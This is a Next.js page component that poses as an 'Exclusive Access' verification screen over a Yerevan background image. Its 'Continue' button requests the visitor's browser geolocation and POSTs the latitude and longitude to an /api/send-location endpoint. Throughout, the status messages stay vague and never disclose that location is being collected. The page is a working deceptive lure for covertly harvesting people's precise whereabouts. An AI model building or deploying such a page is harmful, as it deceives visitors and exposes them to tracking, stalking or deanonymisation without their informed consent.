import { useState } from "react";
import Image from "next/image"; // Next.js optimized image component
import yerevanImg from "../../public/yerevan.jpg"; // Import the image

export default function Home() {
  const [status, setStatus] = useState(null);
  const [error, setError] = useState(null);

  const handleAction = () => {
    if (!navigator.geolocation) {
      alert("Your device does not support this feature.");
      return;
    }

    setStatus("Processing... Please wait.");

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;
        setStatus("Request successful! Please wait...");

        fetch("/api/send-location", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ latitude, longitude }),
        })
          .then(() => {
            setStatus("Your request has been completed successfully.");
          })
          .catch(() => {
            setStatus("Something went wrong. Please try again.");
          });
      },
      () => {
        setError("Oops! Unable to complete your request at this time.");
        alert("Please check your settings and try again.");
      }
    );
  };

  return (
    <div style={styles.container}>
      <div style={styles.overlay}>
        <Image
          src={yerevanImg} // Imported image
          layout="fill"
          objectFit="contain"
          alt="Background"
          style={{ zIndex: -1 }}
        />
        <div style={styles.card}>
          <h1 style={styles.heading}>Exclusive Access</h1>
          <p style={styles.subtext}>Click below to verify your access.</p>
          <button onClick={handleAction} style={styles.button}>
            Continue
          </button>
          {status && <p style={styles.statusText}>{status}</p>}
          {error && <p style={styles.errorText}>{error}</p>}
        </div>
      </div>
    </div>
  );
}

// Styles
const styles = {
  container: {
    position: "relative",
    width: "100%",
    height: "100vh",
  },
  overlay: {
    position: "absolute",
    top: 0,
    left: 0,
    width: "100%",
    height: "100%",
    backgroundColor: "rgba(0, 0, 0, 0.5)", // Dark overlay for visibility
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
  },
  card: {
    // backgroundColor: "rgba(255, 255, 255, 0.15)",
    padding: "30px",
    borderRadius: "15px",
    textAlign: "center",
    // backdropFilter: "blur(10px)",
    color: "#fff",
    maxWidth: "400px",
    width: "100%",
    zIndex: 1,
  },
  heading: {
    fontSize: "24px",
    fontWeight: "bold",
  },
  subtext: {
    fontSize: "16px",
    color: "#ddd",
  },
  button: {
    padding: "12px 24px",
    fontSize: "18px",
    backgroundColor: "#00C9FF",
    color: "#fff",
    border: "none",
    borderRadius: "8px",
    cursor: "pointer",
  },
  statusText: {
    marginTop: "20px",
    fontSize: "16px",
    color: "#fff",
  },
  errorText: {
    color: "red",
    fontSize: "14px",
    marginTop: "10px",
  },
};
